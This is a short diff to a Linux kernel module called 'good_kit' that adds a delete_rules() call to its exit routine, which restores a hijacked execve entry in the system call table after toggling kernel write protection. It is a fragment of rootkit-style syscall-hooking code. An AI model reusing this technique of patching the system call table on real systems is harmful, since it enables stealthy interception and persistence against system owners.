@@ -136,6 +136,8 @@ static void __exit good_kit_exit(void)
     disable_write_protection(); 
     sys_call_table_stolen[__NR_execve] = (unsigned long *)original_execve; 
     enable_write_protection(); 
+
+    delete_rules();
 }
 
 module_init(good_kit_init); 
